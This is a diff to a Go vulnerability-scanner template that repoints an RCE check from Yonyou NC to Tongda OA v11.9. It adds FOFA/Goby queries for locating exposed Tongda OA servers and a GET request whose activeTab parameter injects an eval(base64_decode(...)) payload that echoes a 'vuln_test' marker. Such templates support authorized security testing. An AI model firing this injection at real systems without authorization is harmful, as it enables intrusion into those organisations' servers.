@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "通达OA v11.9 getdata 任意命令执行漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"通达OA网络智能办公系统\" || product=\"通达OA网络智能办公系统\"",
+  "GobyQuery": "app=\"通达OA网络智能办公系统\" || product=\"通达OA网络智能办公系统\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -30,7 +30,7 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "uri": "/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
@@ -51,7 +51,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "vuln_test",
             "bz": ""
           }
         ]
@@ -107,7 +107,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "通达OA v11.9 getdata 任意命令执行漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +116,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "tongda OA v11.9 getdata rce",
       "Product": "",
       "Description": "",
       "Recommendation": "",
